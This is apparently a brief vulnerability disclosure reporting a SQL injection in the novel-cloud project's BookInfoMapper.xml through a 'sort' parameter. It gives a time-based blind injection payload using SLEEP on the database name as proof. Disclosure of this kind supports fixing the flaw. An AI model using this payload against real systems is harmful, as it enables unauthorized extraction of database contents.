I discovered an SQL injection vulnerability in this project that is identical to this onehttps://github.com/mapl3miss/novel-SQLi/blob/main/novelCMS-sqli.md

`novel-cloud-master/novel-book/novel-book-service/src/main/resources/mapper/BookInfoMapper.xml`

![QQ_1744449298736](https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202504121719289.png)

source class：condition

![QQ_1744449641259](https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202504121720500.png)

prove：

sort=(IF(SUBSTRING(DATABASE(),1,1)%3d'a',+SLEEP(5),+1))